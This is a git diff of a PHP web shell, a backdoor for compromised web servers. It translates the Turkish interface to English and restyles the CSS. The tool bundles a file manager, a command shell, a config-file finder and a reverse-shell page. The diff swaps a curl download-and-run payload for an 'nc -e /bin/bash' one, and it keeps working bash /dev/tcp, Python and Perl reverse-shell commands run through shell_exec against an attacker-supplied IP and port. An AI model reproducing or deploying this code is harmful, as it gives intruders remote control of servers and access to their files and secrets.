@@ -75,7 +75,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             header("Location: " . $_SERVER['PHP_SELF']);
             exit();
         } else {
-            $error = "Hatalı kullanıcı adı veya şifre.";
+            $error = "Invalid username or password.";
         }
     }
     if (isset($_POST["downloadFile"])) {
@@ -122,7 +122,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                     unlink($zipFileName);
                     exit();
                 } else {
-                    echo "Zip dosyası oluşturulamadı.";
+                    echo "Zip file could not be created.";
                 }
             } elseif (file_exists($fileToDownload)) {
                 
@@ -136,10 +136,10 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                 readfile($fileToDownload);
                 exit();
             } else {
-                echo "Dosya veya klasör bulunamadı.";
+                echo "File or folder not found.";
             }
         } else {
-            echo "Öncelikle giriş yapmalısınız.";
+            echo "You must log in first.";
         }
     }
     
@@ -148,12 +148,12 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         if (isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true) {
             $fileToDelete = $_POST["deleteFile"];
             if (is_file($fileToDelete) && unlink($fileToDelete)) {
-                echo "<script>alert('Dosya başarıyla silindi.');</script>";
+                echo "<script>alert('File deleted successfully.');</script>";
             } else {
-                echo "<script>alert('Dosya silinemedi.');</script>";
+                echo "<script>alert('File could not be deleted.');</script>";
             }
         } else {
-            echo "Öncelikle giriş yapmalısınız.";
+            echo "You must log in first.";
         }
     }
     if (isset($_POST["editFile"])) {
@@ -167,16 +167,16 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                     $fileContent = @file_get_contents($fileToEdit);
                     if ($fileContent === false) {
                         session_start();
-                        $_SESSION['error_message'] = 'Dosya okuma hatası. Yetkisiz erişim veya dosya bulunamadı.';
+                        $_SESSION['error_message'] = 'File reading error. Unauthorized access or file not found.';
                         header('Location: ' . $_SERVER['HTTP_REFERER']); 
                         exit();
                     }
                     $showFileManager = false;
                 } else {
-                    echo "<script>alert('Belirtilen dosya bulunamadı veya geçersiz bir dosya.');</script>"; 
+                    echo "<script>alert('The specified file could not be found or is an invalid file.');</script>"; 
                 }
             } else {
-                echo "<script>alert('Bu dosya düzenlenemez. Sadece metin dosyaları düzenlenebilir.');</script>"; 
+                echo "<script>alert('This file cannot be edited. Only text files can be edited.');</script>"; 
             }
         }
     }
@@ -209,9 +209,9 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $fileContent = $_POST["fileContent"];
 
         if (file_put_contents($filePath, $fileContent) !== false) {
-            echo "<script>alert('Dosya başarıyla kaydedildi.');</script>";
+            echo "<script>alert('File saved successfully.');</script>";
         } else {
-            echo "<script>alert('Dosya kaydedilemedi.');</script>";
+            echo "<script>alert('File could not be saved.');</script>";
         }
     }
 }
@@ -223,18 +223,18 @@ if (isset($_POST["uploadFile"])) {
         $uploadOk = 1;
         $fileType = strtolower(pathinfo($targetFile, PATHINFO_EXTENSION));
         if (file_exists($targetFile)) {
-            echo "<script>alert('Bu dosya zaten mevcut.');</script>";
+            echo "<script>alert('This file already exists.');</script>";
             $uploadOk = 0;
         }
         if ($uploadOk == 1) {
             if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile)) {
-                echo "<script>alert('Dosya başarıyla yüklendi.');</script>";
+                echo "<script>alert('File uploaded successfully.');</script>";
             } else {
-                echo "<script>alert('Üzgünüm, dosya yüklenemedi.');</script>";
+                echo "<script>alert('Sorry, the file could not be uploaded. Unauthorized access.');</script>";
             }
         }
     } else {
-        echo "<script>alert('Öncelikle giriş yapmalısınız.');</script>";
+        echo "<script>alert('You must log in first.');</script>";
     }
 }
 if (isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true) {
@@ -257,23 +257,51 @@ if (isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true) {
         box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);
         display: flex;
         justify-content: center;
+        gap: 20px;
+        flex-wrap: wrap;
     }
 
     .menu a {
-        margin: 0 20px;
-        padding: 10px 15px;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        padding: 10px 20px;
         text-decoration: none;
         color: #0f0;
         font-size: 1.1rem;
         border: 1px solid transparent;
         border-radius: 5px;
         transition: all 0.3s ease;
+        white-space: nowrap;
     }
 
     .menu a:hover {
         border-color: #0f0;
         box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
         background: rgba(0, 255, 0, 0.1);
+        transform: translateY(-2px);
+    }
+
+    .menu a i {
+        font-size: 1.2rem;
+        transition: transform 0.3s ease;
+    }
+
+    .menu a:hover i {
+        transform: scale(1.2);
+    }
+
+    @media (max-width: 768px) {
+        .menu {
+            flex-direction: column;
+            align-items: center;
+            padding: 10px;
+        }
+        
+        .menu a {
+            width: 100%;
+            justify-content: center;
+        }
     }
 
     .file-manager-container {
@@ -300,9 +328,8 @@ if (isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true) {
         list-style-type: none;
         padding: 0;
         margin: 0;
-        max-height: 500px; /* Set a maximum height for the file list */
-        overflow-y: auto; /* Enable vertical scrolling */
-    }
+        max-height: 500px; 
+        overflow-y: auto; 
 
     .file-item {
         display: flex;
@@ -398,7 +425,6 @@ if (isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true) {
         border-left-color: #89e051;
     }
 
-    /* Tüm butonlar için ortak stiller */
     .button-group button,
     .search-form button,
     .upload-form label.sec {
@@ -417,25 +443,50 @@ if (isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true) {
         justify-content: center;
     }
 
-    /* Hover efekti */
-    
 
-    /* Button grupları için spacing */
     .button-group {
         gap: 6px;
     }
 
-    /* Form içi butonlar arası boşluk */
+    
     .search-form,
     .upload-form {
         gap: 8px;
     }
 
-    /* Input alanları için yükseklik */
+
+    .search-form {
+        display: flex;
+        align-items: center;
+    }
+
     .search-form input[type="text"] {
-        height: 28px;
+        height: 35px;
         padding: 0 10px;
-        font-size: 0.85rem;
+        font-size: 1rem;
+        border: 1px solid #00ff00;
+        border-radius: 5px;
+        background-color: black;
+        color: #00ff00;
+    }
+
+    .search-form button {
+        padding: 10px 20px; /* Match padding with .form-button */
+        background-color: #00ff00; /* Match background color */
+        color: black; /* Match text color */
+        border: none; /* Remove border */
+        border-radius: 5px; /* Match border radius */
+        cursor: pointer; /* Pointer cursor */
+        font-size: 1rem; /* Match font size */
+        transition: background-color 0.3s; /* Match transition */
+        min-width: 120px; /* Set a minimum width for consistent button size */
+        margin-left: 10px; /* Space between input and button */
+        margin-top: 2px; /* Adjust vertical position (decrease this value to move up) */
+        margin-right: 15px; /* Adjust right position */
+    }
+
+    .search-form button:hover {
+        background-color: #00cc00;
     }
 
     .file-info {
@@ -489,43 +540,85 @@ if (isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true) {
         <a href="?server_info=false">File Management</a>
         <a href="?server_info=true">Server Info</a>
         <a href="?scan_f=true">Config Search</a>
-        <a href="?revers=true">Revers Shell</a>
+        <a href="?revers=true">Reverse Shell</a>
         <a href="?terminal=true">Command Shell</a>
     </div>';
     if (isset($_GET['terminal']) && $_GET['terminal'] === 'true') {
         $showFileManager = false;
     
         echo '<style>';
-        echo 'body { font-family: Arial, sans-serif; background-color: #000; color: #0f0; text-align: center; }';
-        echo 'h1 { margin: 20px 0; }';
-        echo 'form { margin-bottom: 20px; }';
-        echo 'input, button { padding: 10px; margin: 10px; font-size: 16px; color: #0f0; background-color: #000; border: 2px solid #0f0; box-shadow: 0 0 10px #0f0; }';
-        echo 'input[type="text"] { width: 400px; }';
-        echo '.terminal-box { border: 2px solid #0f0; border-radius: 10px; padding: 20px; display: inline-block; margin: 10px; box-shadow: 0 0 20px #0f0, inset 0 0 10px #0f0; margin-top: 40px; max-height: 600px; width: 600px; text-align: left; overflow-y: auto; }';
-        echo '.path { font-weight: bold; color: #0f0; }';
-        echo '.help { text-align: left; }';
+        echo '    .terminal-box {';
+        echo '        background: rgba(0, 0, 0, 0.9);';
+        echo '        border: 2px solid #00ff00;';
+        echo '        border-radius: 15px;';
+        echo '        padding: 15px;';
+        echo '        margin: 15px auto;';
+        echo '        max-width: 900px;';
+        echo '        width: 80%;';
+        echo '        box-shadow: 0 0 15px rgba(0, 255, 0, 0.3),';
+        echo '                    inset 0 0 10px rgba(0, 255, 0, 0.2);';
+        echo '    }';
+        echo '    .terminal-box h1 {';
+        echo '        color: #00ff00;';
+        echo '        font-size: 1.6rem;';
+        echo '        text-align: center;';
+        echo '        margin: 10px 0;';
+        echo '        padding: 10px;';
+        echo '        text-transform: uppercase;';
+        echo '        letter-spacing: 2px;';
+        echo '        font-weight: 600;';
+        echo '        text-shadow: 0 0 10px rgba(0, 255, 0, 0.5);';
+        echo '    }';
+        echo '    .form-input {';
+        echo '        padding: 10px;';
+        echo '        width: 80%;';
+        echo '        max-width: 400px;';
+        echo '        border: 1px solid #00ff00;';
+        echo '        border-radius: 5px;';
+        echo '        background-color: #222;';
+        echo '        color: #00ff00;';
+        echo '        font-size: 1rem;';
+        echo '        transition: border-color 0.3s;';
+        echo '    }';
+        echo '    .form-input:focus {';
+        echo '        border-color: #00cc00;';
+        echo '        outline: none;';
+        echo '    }';
+        echo '    .form-button {';
+        echo '        padding: 10px 20px;'; /* Consistent padding */
+        echo '        margin-top: 10px;'; /* Space above the button */
+        echo '        background-color: #00ff00;';
+        echo '        color: black;';
+        echo '        border: none;';
+        echo '        border-radius: 5px;';
+        echo '        cursor: pointer;';
+        echo '        font-size: 1rem;';
+        echo '        transition: background-color 0.3s;';
+        echo '        min-width: 120px;'; /* Set a minimum width for consistent button size */
+        echo '    }';
+        echo '    .form-button:hover {';
+        echo '        background-color: #00cc00;';
+        echo '    }';
         echo '</style>';
     
         echo '<div class="terminal-box">';
-        echo '<h1>Command Shell</h1>';
-    
-    
-    
-        echo '<form method="post">';
-        echo '    <input type="text" name="command" placeholder="Komut girin" autofocus>';
-        echo '    <button type="submit">Gönder</button>';
-        echo '</form>';
+        echo '    <h1>Terminal</h1>';
+        echo '    <form method="post">';
+        echo '        <input type="text" name="command" class="form-input" placeholder="Enter command" autofocus>';
+        echo '        <button type="submit" class="form-button">Send</button>';
+        echo '    </form>';
+        
         if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
             $command = strtolower(trim($_POST['command']));
     
             if ($command === 'help') {
                 echo '<div class="help">';
-                echo '<h3>Kullanılabilir Komutlar:</h3>';
+                echo '<h3>Available Commands:</h3>';
                 echo '<ul>';
-                echo '    <li><strong>cd [dizin]</strong>: Dizini değiştirir.</li>';
-                echo '    <li><strong>ls</strong>: Dosyaları listeler.</li>';
-                echo '    <li><strong>clear</strong>: Ekranı temizler.</li>';
-                echo '    <li><strong>help</strong>: Komut listesini gösterir.</li>';
+                echo '    <li><strong>cd [directory]</strong>: Changes the directory.</li>';
+                echo '    <li><strong>ls</strong>: Lists the files.</li>';
+                echo '    <li><strong>clear</strong>: Clears the screen.</li>';
+                echo '    <li><strong>help</strong>: Shows the list of commands.</li>';
                 echo '</ul>';
                 echo '</div>';
             } elseif ($command === 'clear') {
@@ -535,7 +628,7 @@ if (isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true) {
                 echo '<pre>' . htmlspecialchars($output) . '</pre>';
             }
         }
-    
+        
         echo '</div>'; 
     }
     
@@ -543,52 +636,86 @@ if (isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true) {
        $showFileManager = false;
        
     echo '    <style>';
-    echo '        body {';
-    echo '            font-family: Arial, sans-serif;';
-    echo '            background-color: #000;';
-    echo '            color: #0f0;';
+    echo '        .reverse-shell {';
+    echo '            background: rgba(0, 0, 0, 0.9);';
+    echo '            border: 2px solid #00ff00;';
+    echo '            border-radius: 15px;';
+    echo '            padding: 15px;';
+    echo '            margin: 15px auto;';
+    echo '            max-width: 900px;';
+    echo '            width: 80%;';
+    echo '            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3),';
+    echo '                        inset 0 0 10px rgba(0, 255, 0, 0.2);';
+    echo '        }';
+    echo '        .reverse-shell h1 {';
+    echo '            color: #00ff00;';
+    echo '            font-size: 1.6rem;';
     echo '            text-align: center;';
-    echo '        }';
-    echo '        h1 {';
-    echo '            margin: 20px 0;';
-    echo '        }';
-    echo '        form {';
-    echo '            margin-bottom: 20px;';
-    echo '        }';
-    echo '        input, button {';
+    echo '            margin: 10px 0;';
     echo '            padding: 10px;';
-    echo '            margin: 10px;';
-    echo '            font-size: 16px;';
-    echo '            color: #0f0;';
-    echo '            background-color: #000;';
-    echo '            border: 2px solid #0f0;';
-    echo '            box-shadow: 0 0 10px #0f0;';
-    echo '            text-align: center;';
+    echo '            text-transform: uppercase;';
+    echo '            letter-spacing: 2px;';
+    echo '            font-weight: 600;';
+    echo '            text-shadow: 0 0 10px rgba(0, 255, 0, 0.5);';
     echo '        }';
-    echo '        .neon-box {';
-    echo '            border: 2px solid #0f0;';
-    echo '            border-radius: 10px;';
-    echo '            padding: 20px;';
-    echo '            display: inline-block;';
-    echo '            margin: 10px;';
-    echo '            box-shadow: 0 0 20px #0f0, inset 0 0 10px #0f0;';
-    echo '            margin-top: 40px;';
+    echo '        .form-label {';
+    echo '            color: #00ff00;'; /* Text color */
+    echo '            font-size: 1.2rem;'; /* Font size */
+    echo '            margin-bottom: 10px;'; /* Space below the label */
+    echo '            display: block;'; /* Make it a block element */
     echo '        }';
-    echo '    </style>';
-    echo '<div class="neon-box">';
+    echo '        .form-input {';
+    echo '            padding: 10px;';
+    echo '            width: 80%;';
+    echo '            max-width: 400px;';
+    echo '            border: 1px solid #00ff00;';
+    echo '            border-radius: 5px;';
+    echo '            background-color: #222;';
+    echo '            color: #00ff00;';
+    echo '            font-size: 1rem;';
+    echo '            transition: border-color 0.3s;';
+    echo '        }';
+    echo '        .form-input:focus {';
+    echo '            border-color: #00cc00;';
+    echo '            outline: none;';
+    echo '        }';
+    echo '        .form-button-container {';
+    echo '            display: flex;'; /* Use flexbox for button alignment */
+    echo '            justify-content: center;'; /* Center the buttons */
+    echo '            margin-top: 10px;'; /* Space above the buttons */
+    echo '        }';
+    echo '        .form-button {';
+    echo '            padding: 10px 20px;'; /* Consistent padding */
+    echo '            margin: 0 5px;'; /* Space between buttons */
+    echo '            background-color: #00ff00;';
+    echo '            color: black;';
+    echo '            border: none;';
+    echo '            border-radius: 5px;';
+    echo '            cursor: pointer;';
+    echo '            font-size: 1rem;';
+    echo '            transition: background-color 0.3s;';
+    echo '            min-width: 120px;'; /* Set a minimum width for consistent button size */
+    echo '        }';
+    echo '        .form-button:hover {';
+    echo '            background-color: #00cc00;';
+    echo '        }';
+    echo '</style>';
+    echo '<div class="reverse-shell">';
     echo '    <h1>Reverse Shell</h1>';
-    
     echo '    <form method="post">';
-    echo '        <label for="ip">IP:</label>';
-    echo '        <input type="text" name="ip" id="ip" placeholder="IP adresi" required>';
-    echo '        <br>';
-    echo '        <label for="port">Port:</label>';
-    echo '        <input type="text" name="port" id="port" placeholder="Port numarası" required>';
-    echo '        <br>';
-    echo '        <button type="submit" name="shell" value="curl">Curl ile Shell</button>';
-    echo '        <button type="submit" name="shell" value="bash">Bash ile Shell</button>';
-    echo '        <button type="submit" name="shell" value="python">Python ile Shell</button>';
-    echo '        <button type="submit" name="shell" value="perl">Perl ile Shell</button>';  // Perl butonu
+    echo '        <label for="ip" class="form-label">IP:</label>';
+    echo '        <input type="text" class="form-input" name="ip" id="ip" placeholder="IP address" required>';
+    echo '        <label for="port" class="form-label">Port:</label>';
+    echo '        <input type="text" class="form-input" name="port" id="port" placeholder="Port number" required>';
+    
+    // Button container
+    echo '<div class="form-button-container">';
+    echo '    <button type="submit" name="shell" value="curl" class="form-button">Shell with Nc</button>';
+    echo '    <button type="submit" name="shell" value="bash" class="form-button">Shell with Bash</button>';
+    echo '    <button type="submit" name="shell" value="python" class="form-button">Shell with Python</button>';
+    echo '    <button type="submit" name="shell" value="perl" class="form-button">Shell with Perl</button>';
+    echo '</div>';
+
     echo '    </form>';
     echo '</div>';
     if ($_SERVER['REQUEST_METHOD'] === 'POST') {
@@ -598,13 +725,13 @@ if (isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true) {
     
         switch ($shellType) {
             case 'curl':
-                $command = "curl http://$ip:$port -o /tmp/shell.sh && bash /tmp/shell.sh";
+                $command = "nc -e /bin/bash $ip $port";
                 break;
             case 'bash':
                 $command = "bash -i >& /dev/tcp/$ip/$port 0>&1";
                 break;
             case 'python':
-                $command = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";
+                $command = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";
                 break;
             case 'perl':
                 $command = "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};'";
@@ -615,7 +742,7 @@ if (isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true) {
     
         if ($command) {
             $output = shell_exec($command);
-            echo "<p>Reverse Shell Komutu: <code>$command</code></p>";
+            echo "<p>Reverse Shell Command: <code>$command</code></p>";
             echo "<p>Çıktı: <pre>$output</pre></p>";
         }
     }
@@ -623,139 +750,183 @@ if (isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true) {
 
     if (isset($_GET['scan_f']) && $_GET['scan_f'] === 'true') {
         $showFileManager = false;
-        echo '    <style>';
-        echo '        body {';
-        echo '            font-family: Arial, sans-serif;';
-        echo '            background-color: #000;';
-        echo '            color: #0f0;';
-        echo '            text-align: center;';
-        echo '        }';
-        echo '        h1 {';
-        echo '            margin: 20px 0;';
-        echo '        }';
-        echo '        form {';
-        echo '            margin-bottom: 20px;';
-        echo '        }';
-        echo '        input, button {';
-        echo '            padding: 10px;';
-        echo '            margin: 10px;';
-        echo '            font-size: 16px;';
-        echo '            color: #0f0;';
-        echo '            background-color: #000;';
-        echo '            border: 2px solid #0f0;';
-        echo '            box-shadow: 0 0 10px #0f0;';
-        echo '            text-align: center;';
-        echo '        }';
-        echo '        input[type="text"] {';
-        echo '            width: 250px;'; 
-        echo '        }';
-        echo '        table {';
-        echo '            width: 80%;';
-        echo '            margin: 20px auto;';
-        echo '            border-collapse: collapse;';
-        echo '            border: 2px solid #0f0;';
-        echo '            box-shadow: 0 0 15px #0f0;';
-        echo '        }';
-        echo '        th, td {';
-        echo '            border: 1px solid #0f0;';
-        echo '            padding: 10px;';
-        echo '            text-align: left;';
-        echo '        }';
-        echo '        th {';
-        echo '            background-color: #000;';
-        echo '            color: #0f0;';
-        echo '            box-shadow: 0 0 10px #0f0;';
-        echo '        }';
-        echo '        td {';
-        echo '            background-color: #111;';
-        echo '            color: #0f0;';
-        echo '        }';
-        echo '        .neon-box {';
-        echo '            border: 2px solid #0f0;';
-        echo '            border-radius: 10px;';
-        echo '            padding: 20px;';
-        echo '            display: inline-block;';
-        echo '            margin: 10px;';
-        echo '            box-shadow: 0 0 20px #0f0, inset 0 0 10px #0f0;';
-        echo '            margin-top: 40px;';
-        echo '            max-height: 500px;'; 
-        echo '            overflow-y: auto;'; 
-        echo '        }';
-        echo '    </style>';
-        echo '<div class="neon-box">';
+        echo '<style>';
+        echo '    .config-finder {';
+        echo '        background: rgba(0, 0, 0, 0.9);';
+        echo '        border: 2px solid #00ff00;';
+        echo '        border-radius: 15px;';
+        echo '        padding: 15px;';
+        echo '        margin: 15px auto;';
+        echo '        max-width: 900px;';
+        echo '        width: 80%;';
+        echo '        box-shadow: 0 0 15px rgba(0, 255, 0, 0.3),';
+        echo '                    inset 0 0 10px rgba(0, 255, 0, 0.2);';
+        echo '    }';
+        echo '    .config-finder h1 {';
+        echo '        color: #00ff00;';
+        echo '        font-size: 1.6rem;';
+        echo '        text-align: center;';
+        echo '        margin: 10px 0;';
+        echo '        padding: 10px;';
+        echo '        text-transform: uppercase;';
+        echo '        letter-spacing: 2px;';
+        echo '        font-weight: 600;';
+        echo '        text-shadow: 0 0 10px rgba(0, 255, 0, 0.5);';
+        echo '    }';
+        echo '    .form-label {';
+        echo '        color: #00ff00;'; /* Text color */
+        echo '        font-size: 1.2rem;'; /* Font size */
+        echo '        margin-bottom: 10px;'; /* Space below the label */
+        echo '        display: block;'; /* Make it a block element */
+        echo '    }';
+        echo '    .form-input {';
+        echo '        padding: 10px;';
+        echo '        width: 80%;';
+        echo '        max-width: 400px;';
+        echo '        border: 1px solid #00ff00;';
+        echo '        border-radius: 5px;';
+        echo '        background-color: #222;';
+        echo '        color: #00ff00;';
+        echo '        font-size: 1rem;';
+        echo '        transition: border-color 0.3s;';
+        echo '    }';
+        echo '    .form-input:focus {';
+        echo '        border-color: #00cc00;';
+        echo '        outline: none;';
+        echo '    }';
+        echo '    .form-button {';
+        echo '        padding: 10px 20px;'; /* Consistent padding */
+        echo '        margin-top: 10px;'; /* Space above the button */
+        echo '        background-color: #00ff00;';
+        echo '        color: black;';
+        echo '        border: none;';
+        echo '        border-radius: 5px;';
+        echo '        cursor: pointer;';
+        echo '        font-size: 1rem;';
+        echo '        transition: background-color 0.3s;';
+        echo '        min-width: 120px;'; /* Set a minimum width for consistent button size */
+        echo '    }';
+        echo '    .form-button:hover {';
+        echo '        background-color: #00cc00;';
+        echo '    }';
+        echo '</style>';
+
+        echo '<div class="config-finder">';
         echo '    <h1>Config Finder</h1>';
         echo '    <form method="post">';
-        echo '        <label for="directory">Manuel Dizin Girin:</label>';
-        echo '        <input type="text" class="ad" name="manual_directory" id="manual_directory" placeholder="Dizin girin" value="' . htmlspecialchars($selectedDirectory) . '">';
-        echo '        <br>';
-        echo '        <button type="submit" class="ad" >Ara</button>';
+        echo '        <label for="directory" class="form-label">Enter Manual Directory:</label>';
+        echo '        <input type="text" class="form-input" name="manual_directory" id="manual_directory" placeholder="Enter directory" value="' . htmlspecialchars($selectedDirectory) . '">';
+        echo '        <button type="submit" class="form-button">Search</button>';
         echo '    </form>';
+        
         if (!empty($configFiles)) {
-            echo '    <table>';
-            echo '        <tr>';
-            echo '            <th>Dosya Yolu</th>';
-            echo '        </tr>';
+            echo '<table class="config-table">';
+            echo '<thead>';
+            echo '<tr>';
+            echo '<th>File Path</th>';
+            echo '</tr>';
+            echo '</thead>';
+            echo '<tbody>';
             foreach ($configFiles as $file) {
-                echo '        <tr>';
-                echo '            <td>' . htmlspecialchars($file) . '</td>';
-                echo '        </tr>';
+                echo '<tr>';
+                echo '<td>' . htmlspecialchars($file) . '</td>';
+                echo '</tr>';
             }
-            echo '    </table>';
+            echo '</tbody>';
+            echo '</table>';
         } else {
-            echo '    <p>Seçilen dizinde konfigürasyon dosyası bulunamadı.</p>';
+            echo '<p class="no-files-message">No configuration files found in the selected directory.</p>';
         }
         
         echo '</div>'; 
     }
     if (isset($_GET['server_info']) && $_GET['server_info'] === 'true') {
         $showFileManager = false;
-echo '<style>
-    .neon-box {
-    position: absolute; 
-    top: 50%; 
-    left: 50%;
-    transform: translate(-50%, -50%); 
-    background-color: rgba(0, 255, 0, 0.1); 
-    border: 2px solid lime; 
-    box-shadow: 0 0 20px rgba(0, 255, 0, 0.7); 
-    border-radius: 10px; 
-    padding: 20px;
-    width: 300px; 
-    text-align: center; 
-}
+        echo '<style>';
+        echo '    .neon-box {';
+        echo '        background: rgba(0, 0, 0, 0.9);';
+        echo '        border: 2px solid #00ff00;';
+        echo '        border-radius: 15px;';
+        echo '        padding: 15px;';
+        echo '        margin: 15px auto;';
+        echo '        max-width: 900px;';
+        echo '        width: 80%;';
+        echo '        box-shadow: 0 0 15px rgba(0, 255, 0, 0.3),';
+        echo '                    inset 0 0 10px rgba(0, 255, 0, 0.2);';
+        echo '    }';
+        echo '    .section-title {';
+        echo '        color: #00ff00;';
+        echo '        font-size: 1.6rem;';
+        echo '        text-align: center;';
+        echo '        margin: 10px 0;';
+        echo '        padding: 10px;';
+        echo '        border-bottom: 2px solid #00ff00;';
+        echo '        text-transform: uppercase;';
+        echo '        letter-spacing: 2px;';
+        echo '        font-weight: 600;';
+        echo '        text-shadow: 0 0 10px rgba(0, 255, 0, 0.5);';
+        echo '        display: flex;';
+        echo '        align-items: center;';
+        echo '        justify-content: center;';
+        echo '        gap: 10px;';
+        echo '    }';
+        echo '    .section-title i {';
+        echo '        font-size: 1.8rem;';
+        echo '        margin-right: 10px;';
+        echo '    }';
+        echo '    .config-table {';
+        echo '        width: 100%;';
+        echo '        border-collapse: separate;';
+        echo '        border-spacing: 0;';
+        echo '        margin: 15px 0;';
+        echo '        background: rgba(0, 0, 0, 0.7);';
+        echo '        border-radius: 10px;';
+        echo '        overflow: hidden;';
+        echo '    }';
+        echo '    .config-table thead {';
+        echo '        background: rgba(0, 255, 0, 0.1);';
+        echo '    }';
+        echo '    .config-table th {';
+        echo '        padding: 12px;';
+        echo '        color: #00ff00;';
+        echo '        font-size: 1rem;';
+        echo '        font-weight: 600;';
+        echo '        text-transform: uppercase;';
+        echo '        letter-spacing: 1px;';
+        echo '        border-bottom: 2px solid #00ff00;';
+        echo '    }';
+        echo '    .config-table tr:hover {';
+        echo '        background: rgba(0, 255, 0, 0.05);';
+        echo '    }';
+        echo '    .config-table td {';
+        echo '        padding: 8px 12px;';
+        echo '        color: #fff;';
+        echo '        border-bottom: 1px solid rgba(0, 255, 0, 0.1);';
+        echo '    }';
+        echo '    .config-table tr:last-child td {';
+        echo '        border-bottom: none;';
+        echo '    }';
+        echo '</style>';
 
+        echo '<div class="neon-box">';
+        echo '<h1 class="section-title"><i class="fas fa-server"></i> Server Configuration</h1>';
+        echo '<table class="config-table">';
+        echo '<thead>';
+        echo '<tr>';
+        echo '<th><i class="fas fa-cogs"></i> Configuration</th>';
+        echo '<th><i class="fas fa-info-circle"></i> Value</th>';
+        echo '</tr>';
+        echo '</thead>';
 
-        h2 {
-            color: lime;
+        foreach ($server_info as $key => $value) {
+            echo '<tr>';
+            echo '<td>' . htmlspecialchars($key) . '</td>';
+            echo '<td>' . htmlspecialchars($value) . '</td>';
+            echo '</tr>';
         }
 
-        ul {
-            list-style-type: none; 
-            padding: 0; 
-        }
-
-        li {
-            margin: 10px 0;
-            color: #00FF00; 
-        }
-</style>';
-echo '<div class="neon-box">';
-echo '<h1>Server Configuration</h1>';
-echo '<table>';
-echo '<tr>';
-echo '<th>Configuration</th>';
-echo '<th>Value</th>';
-echo '</tr>';
-
-foreach ($server_info as $key => $value) {
-    echo '<tr>';
-    echo '<td>' . htmlspecialchars($key) . '</td>';
-    echo '<td>' . htmlspecialchars($value) . '</td>';
-    echo '</tr>';
-}
-
-echo '</table>';
-echo '</div>';
+        echo '</table>';
+        echo '</div>';
     }
     if(isset($_GET['server_info']) && $_GET['server_info'] === 'false'){
         $showFileManager = true;
@@ -768,28 +939,28 @@ echo '</div>';
     $items = listDirectory($currentDir);
     if ($showFileManager) {
         echo '<div class="file-manager-container">';
-        echo '<h2 class="directory-title">Dizin: <span>' . htmlspecialchars($currentDir) . '</span></h2>';
+        echo '<h2 class="directory-title">Directory: <span>' . htmlspecialchars($currentDir) . '</span></h2>';
     
         // Search form
         echo '<form action="" method="post" class="search-form">
-                <input type="text" name="searchQuery" placeholder="Dosya ara" required>
-                <button type="submit" name="searchFile">Ara</button>
+                <input type="text" name="searchQuery" placeholder="Search file" required>
+                <button type="submit" name="searchFile" class="form-button">Search</button>
               </form>';
         
         // Upload form
         echo '<div class="upload-form" style="margin-bottom: 1px;">';
         echo '<form action="" method="post" enctype="multipart/form-data">
                 <input type="file" id="file-upload" name="fileToUpload" onchange="displayFileName()" style="display:none;">
-                <label class="sec" for="file-upload">Dosya Seç</label>
+                <label class="sec" for="file-upload">Select File</label>
                 <div id="file-name" class="uploaded-file" style="display:none;"></div>
                 <input type="hidden" name="currentDir" value="' . htmlspecialchars($currentDir) . '">
-                <button type="submit" name="uploadFile" class="std-button">Yükle</button>
+                <button type="submit" name="uploadFile" class="std-button">Upload</button>
               </form>
             </div>';
         
         // Back button
         echo '<div class="back-button-wrapper" style="margin-top: 1px;">';
-        echo '<a class="back-button" href="?dir=' . urlencode($parentDir) . '">← Geri</a>
+        echo '<a class="back-button" href="?dir=' . urlencode($parentDir) . '">←Back</a>
               </div>';
         
         echo "<ul class='file-list'>";
@@ -820,15 +991,15 @@ if (is_dir($fullPath)) {
             echo "<div class='button-group' style='margin-left: -10px;'>";
                 echo '<form action="" method="post" class="download-form">
                         <input type="hidden" name="downloadFile" value="' . htmlspecialchars($fullPath) . '">
-                    <button type="submit">İndir</button>
+                    <button type="submit">Download</button>
                       </form>';
                 echo '<form action="" method="post" class="delete-form">
                         <input type="hidden" name="deleteFile" value="' . htmlspecialchars($fullPath) . '">
-                    <button type="submit">Sil</button>
+                    <button type="submit">Delete</button>
                       </form>';
                 echo '<form action="" method="post" class="edit-form">
                         <input type="hidden" name="editFile" value="' . htmlspecialchars($fullPath) . '">
-                    <button type="submit">Düzenle</button>
+                    <button type="submit">Edit</button>
                       </form>';
             echo "</div>"; // Close button-group
             echo "</li>"; // Close file-item
@@ -843,34 +1014,50 @@ if (is_dir($fullPath)) {
                 <textarea name="fileContent" rows="10" cols="50">' . htmlspecialchars($fileContent) . '</textarea><br>
